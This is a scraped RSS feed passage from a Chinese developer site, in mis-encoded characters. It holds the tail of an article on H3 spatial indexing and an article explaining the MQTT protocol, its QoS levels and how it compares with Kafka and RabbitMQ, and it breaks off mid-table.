<li><strong>æ€§èƒ½</strong>ï¼šå…³é”®è·¯å¾„ç”±é«˜æ•ˆçš„ C ä»£ç å¤„ç†ã€‚</li>
<li><strong>è·¨å¹³å°</strong>ï¼šåŒä¸€å¥— Java API å¯ä»¥åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸Šè¿è¡Œï¼Œåªéœ€åŠ è½½å¯¹åº”çš„æœ¬åœ°åº“å³å¯ã€‚</li>
<li><strong>ç»´æŠ¤æ€§</strong>ï¼šæ ¸å¿ƒç®—æ³•åªæœ‰ä¸€ä»½ C å®ç°ï¼Œè¢«æ‰€æœ‰è¯­è¨€ï¼ˆJava, Python, Go, Rustç­‰ï¼‰çš„ç»‘å®šåº“å…±äº«ã€‚</li>
</ul>
<h3 data-id="heading-13">æ€»ç»“</h3>
<p><code>geoToH3</code>Â çš„é«˜æ•ˆæ€§æºäºï¼š</p>
<ol>
<li><strong>åŸºäºæ­£äºŒåé¢ä½“çš„å·§å¦™å»ºæ¨¡</strong>ï¼šç”¨20ä¸ªé¢ç‰‡è¿‘ä¼¼çƒé¢ï¼Œå°†å¤æ‚çš„çƒé¢å‡ ä½•é—®é¢˜åˆ†è§£ä¸º20ä¸ªæ›´ç®€å•çš„å¹³é¢é—®é¢˜ã€‚</li>
<li><strong>é«˜åº¦ä¼˜åŒ–çš„åº•å±‚ç®—æ³•</strong>ï¼šæ ¸å¿ƒè®¡ç®—ä½¿ç”¨ C è¯­è¨€å®ç°ï¼Œå¤§é‡ä½¿ç”¨æ•´æ•°è¿ç®—å’ŒæŸ¥æ‰¾è¡¨ï¼Œé¿å…äº†æ˜‚è´µçš„æµ®ç‚¹æ•°è¿ç®—å’Œå‡½æ•°è°ƒç”¨ã€‚</li>
<li><strong>ç´§å‡‘çš„ç´¢å¼•ç¼–ç </strong>ï¼šå°†å¤æ‚çš„ç©ºé—´å…³ç³»ç¼–ç ä¸ºä¸€ä¸ª 64 ä½æ•´æ•°ï¼Œä½¿å¾—å­˜å‚¨ã€ä¼ è¾“å’Œè®¡ç®—éƒ½éå¸¸é«˜æ•ˆã€‚</li>
<li><strong>JNI æ¶æ„</strong>ï¼šJava å±‚åªè´Ÿè´£ç®€å•çš„è°ƒç”¨å’Œå°è£…ï¼Œè®¡ç®—é‡ä»»ç”±æœ¬åœ°åº“æ‰¿æ‹…ã€‚</li>
</ol>
<p>æ­£æ˜¯è¿™äº›è®¾è®¡ï¼Œä½¿å¾— H3 æˆä¸ºä¸€ä¸ªåœ¨æ€§èƒ½å’ŒåŠŸèƒ½ä¸Šéƒ½æå…¶å‡ºè‰²çš„ç©ºé—´ç´¢å¼•å·¥å…·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å‘éœ€æŒæ¡çš„çŸ¥è¯†ï¼šMQTTåè®®]]></title>    <link>https://juejin.cn/post/7582845425402757160</link>    <guid>https://juejin.cn/post/7582845425402757160</guid>    <pubDate>2025-12-13T06:29:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582845425402757160" data-draft-id="7572776177690083337" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å‘éœ€æŒæ¡çš„çŸ¥è¯†ï¼šMQTTåè®®"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2025-12-13T06:29:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸‰å¹´ä¹‹çº¦"/> <meta itemprop="url" content="https://juejin.cn/user/3448523142729784"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å‘éœ€æŒæ¡çš„çŸ¥è¯†ï¼šMQTTåè®®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3448523142729784/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸‰å¹´ä¹‹çº¦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T06:29:28.000Z" title="Sat Dec 13 2025 06:29:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>MQTTï¼ˆMessage Queuing Telemetry Transportï¼‰æ˜¯ä¸€ç§è½»é‡çº§çš„ã€åŸºäºå‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯ä¼ è¾“åè®®ï¼Œå¹¿æ³›ç”¨äºç‰©è”ç½‘ï¼ˆIoTï¼‰å’Œç§»åŠ¨åº”ç”¨ç­‰ä½å¸¦å®½ã€ä¸ç¨³å®šç½‘ç»œç¯å¢ƒä¸‹çš„æ¶ˆæ¯æ¨é€ã€‚ä»¥ä¸‹æ˜¯å…³äºMQTTåè®®æ¨é€çš„æ ¸å¿ƒæ¦‚å¿µã€å·¥ä½œåŸç†åŠå…³é”®ç‰¹æ€§çš„ç»“æ„åŒ–è¯´æ˜ï¼š</p>
<hr/>
<h3 data-id="heading-0"><strong>1. MQTTåè®®æ ¸å¿ƒè§’è‰²</strong></h3>
<ul>
<li><strong>å‘å¸ƒè€…ï¼ˆPublisherï¼‰</strong><br/>
å‘ç‰¹å®šä¸»é¢˜ï¼ˆTopicï¼‰å‘é€æ¶ˆæ¯çš„å®¢æˆ·ç«¯ã€‚ä¾‹å¦‚ï¼šä¼ æ„Ÿå™¨ä¸ŠæŠ¥æ•°æ®ã€‚</li>
<li><strong>è®¢é˜…è€…ï¼ˆSubscriberï¼‰</strong><br/>
è®¢é˜…æ„Ÿå…´è¶£çš„ä¸»é¢˜å¹¶æ¥æ”¶æ¶ˆæ¯çš„å®¢æˆ·ç«¯ã€‚ä¾‹å¦‚ï¼šä»ªè¡¨ç›˜æ˜¾ç¤ºä¼ æ„Ÿå™¨æ•°æ®ã€‚</li>
<li><strong>ä»£ç†æœåŠ¡å™¨ï¼ˆBrokerï¼‰</strong><br/>
æ¥æ”¶ã€è½¬å‘æ¶ˆæ¯çš„æ ¸å¿ƒæœåŠ¡å™¨ï¼ˆå¦‚Mosquittoã€EMQXï¼‰ã€‚è´Ÿè´£ä¸»é¢˜ç®¡ç†ã€æ¶ˆæ¯è·¯ç”±ã€QoSæ§åˆ¶ç­‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1"><strong>2. ä¸»é¢˜ï¼ˆTopicï¼‰ä¸æ¶ˆæ¯è·¯ç”±</strong></h3>
<ul>
<li>
<p><strong>Topicç»“æ„</strong><br/>
ä½¿ç”¨å±‚çº§è·¯å¾„æ ‡è¯†ï¼ˆå¦‚Â <code>home/room1/temperature</code>ï¼‰ï¼Œæ”¯æŒé€šé…ç¬¦ï¼š</p>
<ul>
<li><code>+</code>ï¼šå•å±‚é€šé…ç¬¦ï¼ˆ<code>home/+/temperature</code>Â åŒ¹é…æ‰€æœ‰æˆ¿é—´æ¸©åº¦ï¼‰ã€‚</li>
<li><code>#</code>ï¼šå¤šå±‚é€šé…ç¬¦ï¼ˆ<code>home/#</code>Â åŒ¹é…æ‰€æœ‰å­ä¸»é¢˜ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ¶ˆæ¯è·¯ç”±</strong><br/>
Brokeræ ¹æ®Topicå°†æ¶ˆæ¯æ¨é€ç»™æ‰€æœ‰è®¢é˜…äº†è¯¥Topicçš„å®¢æˆ·ç«¯ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-2"><strong>3. æ¶ˆæ¯æœåŠ¡è´¨é‡ï¼ˆQoSï¼‰</strong></h3>

























<table><thead><tr><th>QoSç­‰çº§</th><th>æè¿°</th><th>åœºæ™¯ç¤ºä¾‹</th></tr></thead><tbody><tr><td>0</td><td>æœ€å¤šä¸€æ¬¡ï¼Œä¸ä¿è¯é€è¾¾ï¼ˆFire-and-Forgetï¼‰</td><td>å®æ—¶ä¼ æ„Ÿå™¨æ•°æ®æµ</td></tr><tr><td>1</td><td>è‡³å°‘ä¸€æ¬¡ï¼Œå¯èƒ½é‡å¤ï¼ˆBrokeréœ€å›å¤ACKï¼‰</td><td>ç¡®ä¿è®¾å¤‡æŒ‡ä»¤åˆ°è¾¾</td></tr><tr><td>2</td><td>æ°å¥½ä¸€æ¬¡ï¼Œä¸¥æ ¼ä¸é‡ä¸ä¸¢ï¼ˆéœ€ä¸¤æ¬¡æ¡æ‰‹ï¼‰</td><td>é‡‘èäº¤æ˜“ã€é«˜æ•æ„Ÿæ“ä½œ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-3"><strong>4. æ¨é€æµç¨‹ç¤ºä¾‹</strong></h3>
<ol>
<li><strong>è¿æ¥</strong><br/>
å®¢æˆ·ç«¯é€šè¿‡TCP/IPè¿æ¥Brokerï¼Œä½¿ç”¨ç”¨æˆ·å/å¯†ç æˆ–Tokené‰´æƒï¼ˆå¯é…ç½®TLSåŠ å¯†ï¼‰ã€‚</li>
<li><strong>è®¢é˜…</strong><br/>
Subscriberè®¢é˜…Topicï¼ˆå¦‚Â <code>home/room1/+</code>ï¼‰ï¼ŒBrokerä¿ç•™å…¶è®¢é˜…å…³ç³»ã€‚</li>
<li><strong>å‘å¸ƒ</strong><br/>
Publisherå‘é€æ¶ˆæ¯è‡³Brokerï¼ŒåŒ…å«Topicå’ŒPayloadã€‚</li>
<li><strong>æ¨é€</strong><br/>
Brokerå°†æ¶ˆæ¯æ¨é€ç»™æ‰€æœ‰è®¢é˜…è€…ï¼Œæ ¹æ®QoSç­‰å¾…ACKæˆ–é‡è¯•ã€‚</li>
<li><strong>æ–­è¿</strong><br/>
æ”¯æŒé—å˜±æ¶ˆæ¯ï¼ˆLast Willï¼‰æœºåˆ¶ï¼Œå®¢æˆ·ç«¯æ–­è¿æ—¶Brokerä¸»åŠ¨æ¨é€é¢„è®¾æ¶ˆæ¯ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-4"><strong>5. å…³é”®ç‰¹æ€§</strong></h3>
<ul>
<li><strong>ä½å»¶è¿Ÿä¸ä½å¸¦å®½</strong><br/>
åè®®å¤´ä»…2å­—èŠ‚ï¼Œé€‚åˆåµŒå…¥å¼è®¾å¤‡ã€‚</li>
<li><strong>ä¼šè¯ä¿æŒï¼ˆPersistent Sessionï¼‰</strong><br/>
Brokerä¿å­˜ç¦»çº¿å®¢æˆ·ç«¯çš„è®¢é˜…å…³ç³»å’Œæœªæ¥æ”¶æ¶ˆæ¯ï¼ˆéœ€Clean Session=0ï¼‰ã€‚</li>
<li><strong>åŒå‘é€šä¿¡</strong><br/>
è®¢é˜…è€…ä¹Ÿå¯å‘å¸ƒæ¶ˆæ¯ï¼Œæ”¯æŒè¯·æ±‚/å“åº”æ¨¡å¼ã€‚</li>
<li><strong>å®‰å…¨æœºåˆ¶</strong><br/>
æ”¯æŒTLS/SSLåŠ å¯†ã€OAuth2.0ã€å®¢æˆ·ç«¯è¯ä¹¦ç­‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-5"><strong>6. å…¸å‹åº”ç”¨åœºæ™¯</strong></h3>
<ul>
<li><strong>ç‰©è”ç½‘è®¾å¤‡é¥æµ‹</strong><br/>
ä¼ æ„Ÿå™¨å®æ—¶æ•°æ®ä¸Šä¼ è‡³äº‘ç«¯åˆ†æã€‚</li>
<li><strong>ç§»åŠ¨æ¨é€é€šçŸ¥</strong><br/>
åº”ç”¨é€šè¿‡MQTTå®ç°ä½åŠŸè€—æ¨é€ï¼ˆå¯¹æ¯”HTTPé•¿è½®è¯¢ï¼‰ã€‚</li>
<li><strong>å·¥ä¸šè®¾å¤‡ç›‘æ§</strong><br/>
å·¥å‚è®¾å¤‡çŠ¶æ€å®æ—¶æ¨é€åˆ°ç›‘æ§å¤§å±ã€‚</li>
</ul>
<h3 data-id="heading-6"><strong>6. MQTTä¸MQå¯¹æ¯”</strong></h3>
<p>ä»¥ä¸‹æ˜¯MQTTä¸å¸¸è§ä¼ ç»Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆå¦‚Â <strong>RabbitMQã€Kafkaã€RocketMQ</strong>ï¼‰çš„å¯¹æ¯”ï¼Œä»Javaå¼€å‘è§†è§’æ•´ç†å…³é”®å·®å¼‚ç‚¹ï¼š</p>
































































































<table><thead><tr><th><strong>ç»´åº¦</strong></th><th><strong>MQTT</strong></th><th><strong>ä¼ ç»ŸMQï¼ˆRabbitMQ/Kafka/RocketMQï¼‰</strong></th><th><strong>å¤‡æ³¨</strong></th></tr></thead><tbody><tr><td><strong>è®¾è®¡ç›®æ ‡</strong></td><td>ä½åŠŸè€—ã€å¼±ç½‘ç¯å¢ƒï¼Œè®¾å¤‡ç«¯-äº‘ç«¯é€šä¿¡</td><td>é«˜ååã€ä¼ä¸šçº§æœåŠ¡å™¨é—´é€šä¿¡</td><td>MQTTçš„<code>IoTåœºæ™¯</code>Â vs MQçš„<code>å¤§æ•°æ®/å¾®æœåŠ¡åœºæ™¯</code></td></tr><tr><td><strong>åè®®å¤´å¤§å°</strong></td><td>æœ€å°2å­—èŠ‚ï¼ˆæ— æ¶ˆæ¯ä½“æ—¶ï¼‰</td><td>å¤æ‚åè®®å¤´ï¼š â€¢ AMQP(KBçº§) â€¢ Kafka(åŠ¨æ€)</td><td>MQTTåœ¨ç§»åŠ¨ç½‘ç»œä¸‹æ˜¾è‘—é™ä½æµé‡æ¶ˆè€—</td></tr><tr><td><strong>è¿æ¥æ–¹å¼</strong></td><td>é•¿è¿æ¥ï¼ˆåŸºäºTCP/IPï¼‰</td><td>é•¿è¿æ¥ï¼ˆTCPï¼‰æˆ–çŸ­è¿æ¥ï¼ˆHTTPï¼‰</td><td>MQTTçš„<code>Keep-Alive</code>æœºåˆ¶æ›´çœç”µ</td></tr><tr><td><strong>é€šä¿¡æ¨¡å‹</strong></td><td>ä¸¥æ ¼<strong>å‘å¸ƒ/è®¢é˜…</strong>ï¼ŒTopicå¤šå¯¹å¤š</td><td>å¤šæ ·åŒ–æ¨¡å‹ï¼š â€¢ Queueç‚¹å¯¹ç‚¹ â€¢ Exchange Pub/Sub â€¢ Kafka Stream</td><td>MQçš„æ¨¡å‹æ›´çµæ´»ï¼Œä½†éœ€å¤æ‚é…ç½®ï¼ˆå¦‚Kafkaåˆ†åŒºã€RabbitMQ Exchangeç»‘å®šï¼‰</td></tr><tr><td><strong>æœåŠ¡è´¨é‡(QoS)</strong></td><td>0/1/2ä¸‰çº§ï¼Œåè®®å±‚ä¿è¯</td><td>ä¾èµ–ä¸šåŠ¡å±‚å®ç°ï¼ˆå¦‚Kafkaçš„<code>acks=all</code>+ç”Ÿäº§æ¶ˆè´¹ç¡®è®¤ï¼‰</td><td>MQTT QoSå¯¹Javaå¼€å‘è€…æ›´é€æ˜ï¼Œå‡å°‘ä¸šåŠ¡ä»£ç </td></tr><tr><td><strong>å®æ—¶æ€§</strong></td><td><strong>æœåŠ¡ç«¯ä¸»åŠ¨æ¨é€</strong>ï¼Œå»¶è¿Ÿå¯ä½è‡³100ms</td><td>æ¶ˆè´¹è€…éœ€ä¸»åŠ¨æ‹‰å–ï¼ˆPollï¼‰ï¼Œå»¶è¿Ÿé€šå¸¸100ms-1s</td><td>MQTTé€‚åˆ<code>ç§»åŠ¨ç«¯é€šçŸ¥</code>ã€<code>å®æ—¶ç›‘æ§</code></td></tr><tr><td><strong>æ¶ˆæ¯ä¿åº</strong></td><td>ä»…æ”¯æŒå•ä¸»é¢˜å†…æœ‰åº</td><td>Kafkaï¼šåˆ†åŒºå†…ä¸¥æ ¼æœ‰åº RabbitMQï¼šéœ€å…¨å±€é˜Ÿåˆ—</td><td>MQåœ¨<code>äº¤æ˜“æµæ°´</code>ç­‰åœºæ™¯æœ‰ä¼˜åŠ¿</td></tr><tr><td><strong>ååé‡</strong></td><td>å•Brokeræ”¯æŒ10K-100Kçº§æ¶ˆæ¯/ç§’</td><td>Kafkaå¯æ”¯æŒç™¾ä¸‡çº§/ç§’ï¼ŒRabbitMQ 10K-50K/ç§’</td><td>MQåœ¨<code>æ—¥å¿—æ”¶é›†</code>ã€<code>æ•°æ®ç®¡é“</code>åœºæ™¯æ›´ä¼˜</td></tr><tr><td><strong>æ¶ˆæ¯å¤§å°</strong></td><td>æœ€å¤§256MBï¼Œä½†æ¨è&lt;1MBï¼ˆé¿å…å¼±ç½‘é˜»å¡ï¼‰</td><td>æ”¯æŒè¶…å¤§æ¶ˆæ¯ï¼š â€¢ Kafkaé»˜è®¤1MB-10MB â€¢ RabbitMQæ— é™åˆ¶</td><td>MQTTä¼˜å…ˆä¼˜åŒ–å°åŒ…åœºæ™¯</td></tr><tr><td><strong>å®¢æˆ·ç«¯èµ„æºå ç”¨</strong></td><td>æä½ï¼ˆPaho Javaåº“ä»…50KB-100KBï¼‰</td><td>è¾ƒé«˜ï¼š â€¢ Kafkaå®¢æˆ·ç«¯å †å†…å­˜&gt;100MB â€¢ Spring AMQPéœ€å¤šæ¨¡å—ä¾èµ–</td><td>MQTTé€‚åˆ<code>åµŒå…¥å¼Java</code>ï¼ˆå¦‚Android Appï¼‰</td></tr><tr><td><strong>æ–­è¿æ¢å¤</strong></td><td>è‡ªåŠ¨ï¼š â€¢ QoS1/2é‡ä¼  â€¢ Persistent Session</td><td>éœ€æ‰‹åŠ¨ï¼š â€¢ Kafkaï¼šRebalanceç›‘å¬ â€¢ RabbitMQï¼šæ¶ˆè´¹è€…æ¢å¤ç›‘å¬</td><td>MQTTå¼±ç½‘ä¸‹å¯¹Javaå¼€å‘è€…æ›´å‹å¥½</td></tr><tr><td><strong>ä¸»é¢˜ç®¡ç†</strong></td><td>åŠ¨æ€Topicï¼ˆæ— éœ€é¢„åˆ›å»ºï¼‰</td><td>éœ€é¢„å£°æ˜ï¼š â€¢ Exchange/Queue â€¢ Kafka Topic</td><td>MQTTçš„Javaä»£ç æ— éœ€ç®¡ç†Topicç”Ÿå‘½å‘¨æœŸ</td></tr><tr><td><strong>å®‰å…¨æœºåˆ¶</strong></td><td>æ”¯æŒTLS/SSLï¼Œè®¤è¯ç®€å•ï¼ˆç”¨æˆ·å/Tokenï¼‰</td><td>å¤æ‚ï¼š â€¢ Kafkaï¼šSASL/Kerberos â€¢ RabbitMQï¼šOAuth2+Policy</td><td>MQçš„å®‰å…¨åŠŸèƒ½é€‚åˆ<code>ä¼ä¸šçº§ç³»ç»Ÿ</code></td><td/></tr><tr><td><strong>é€‚ç”¨Javaåœºæ™¯</strong></td><td>â€¢ IoTè®¾å¤‡ç®¡ç† â€¢ ç§»åŠ¨æ¨é€ â€¢ è·¨å…¬ç½‘é€šä¿¡</td><td>â€¢ å¾®æœåŠ¡è§£è€¦ â€¢ å¤§æ•°æ®ç®¡é“ â€¢ é‡‘èçº§äº‹åŠ¡</td><td>ä¸¤è€…å¯ç»“åˆä½¿ç”¨ï¼ˆå¦‚è®¾å¤‡â†’MQTTâ†’Kafkaâ†’åˆ†æï¼‰</td></tr></tbody></table>
<hr/>
<p>ä»¥ä¸‹æ˜¯<strong>å¼±ç½‘åœºæ™¯</strong>çš„MQTTä¸MQå¯¹æ¯”ï¼š</p>





















































<table><thead><tr><th><strong>å¼±ç½‘é—®é¢˜</strong></th><th><strong>MQTTçš„è§£å†³æ–¹æ¡ˆ</strong></th><th><strong>ä¼ ç»ŸMQçš„å±€é™æ€§</strong></th><th><strong>å¯¹Javaå¼€å‘è€…çš„æ„ä¹‰</strong></th></tr></thead><tbody><tr><td><strong>æ¶ˆæ¯ä¸¢å¤±ï¼ˆç½‘ç»œä¸­æ–­ï¼‰</strong></td><td>â€¢Â <strong>QoS1/2</strong>ï¼šåè®®å±‚è‡ªåŠ¨é‡ä¼  â€¢Â <strong>Persistent Session</strong>ï¼šæ–­ç½‘åBrokerä¿ç•™ç¦»çº¿æ¶ˆæ¯ï¼ˆè®¢é˜…è€…æ¢å¤åè¡¥å‘ï¼‰ â€¢Â <strong>æœ¬åœ°æŒä¹…åŒ–</strong>ï¼šPahoå®¢æˆ·ç«¯æœ¬åœ°ç£ç›˜ç¼“å­˜æ¶ˆæ¯</td><td>â€¢ ä¾èµ–ä¸šåŠ¡å±‚é‡è¯•ï¼ˆå¦‚Kafkaçš„<code>retries=3</code>ï¼‰ â€¢ æ–­è¿åæœªæ¶ˆè´¹æ¶ˆæ¯éœ€ä¾èµ–å¤–éƒ¨å­˜å‚¨ï¼ˆå¦‚Redisï¼‰ â€¢ æ¶ˆè´¹è€…éœ€ç›‘å¬<code>ConsumerRebalance</code>äº‹ä»¶æ‰‹åŠ¨æ¢å¤æ¶ˆè´¹</td><td>å‡å°‘Javaä»£ç ä¸­<strong>æ‰‹åŠ¨å®ç°é‡è¯•ã€æ–­è¿æ¢å¤</strong>çš„å¤æ‚åº¦ï¼ŒMQTTåè®®å±‚è‡ªåŠ¨å¤„ç†ï¼Œå¼€å‘è€…åªéœ€é…ç½®QoSå‚æ•°å’Œä¼šè¯æ¨¡å¼</td></tr><tr><td><strong>å»¶è¿Ÿæ•æ„Ÿï¼ˆé«˜æŠ–åŠ¨ï¼‰</strong></td><td>â€¢Â <strong>é•¿è¿æ¥+å¿ƒè·³</strong>ï¼šæŒç»­ä¿æ´»ï¼Œé¿å…é‡å»ºTCP â€¢Â <strong>ä¸»åŠ¨æ¨é€</strong>ï¼šæœåŠ¡ç«¯åˆ°å®¢æˆ·ç«¯æ— å»¶è¿Ÿ â€¢Â <strong>åŠ¨æ€QoS</strong>ï¼šç½‘ç»œå·®æ—¶å¯è‡ªåŠ¨é™çº§ï¼ˆå¦‚QoS2â†’1ï¼‰</td><td>â€¢Â <strong>çŸ­è¿æ¥è½®è¯¢</strong>ï¼šHTTPæ¨¡å¼å¢åŠ å»¶è¿Ÿï¼ˆå¦‚RabbitMQçš„Web STOMPï¼‰ â€¢Â <strong>æ‹‰å–æ¨¡å¼</strong>ï¼š<code>poll()</code>é—´éš”å¯¼è‡´å»¶è¿Ÿï¼ˆKafkaæœ€å°é—´éš”500msï¼‰</td><td>Javaå®¢æˆ·ç«¯æ— éœ€å¤æ‚é€»è¾‘å³å¯å®ç°<strong>ä½å»¶è¿Ÿé€šä¿¡</strong>ï¼Œå°¤å…¶åœ¨ç§»åŠ¨è®¾å¤‡ï¼ˆå¦‚Android Appï¼‰ä¸­æ˜¾è‘—ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</td></tr><tr><td><strong>é¢‘ç¹æ–­è¿ï¼ˆç½‘ç»œåˆ‡æ¢ï¼‰</strong></td><td>â€¢Â <strong>é—å˜±æ¶ˆæ¯</strong>ï¼šæ–­è¿æ—¶Brokerè‡ªåŠ¨é€šçŸ¥ï¼ˆå¦‚<code>device/123/offline</code>ï¼‰ â€¢Â <strong>ä¼šè¯ä¿æŒ</strong>ï¼šå¿«é€Ÿé‡è¿åæ¢å¤è®¢é˜…çŠ¶æ€ï¼ˆæ— éœ€é‡å¤è®¢é˜…ï¼‰</td><td>â€¢ éœ€ä¸šåŠ¡å±‚ç›‘å¬<code>connection_closed</code>äº‹ä»¶ â€¢ æ–­è¿åéœ€æ‰‹åŠ¨é‡å»ºèµ„æºï¼ˆå¦‚Kafkaçš„<code>consumer.seek()</code>é‡æ–°å®šä½ï¼‰</td><td>é€šè¿‡MQTTçš„<strong>è‡ªåŠ¨æ–­è¿æ£€æµ‹ä¸é€šçŸ¥</strong>ï¼ŒJavaå¼€å‘åªéœ€å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼Œæ— 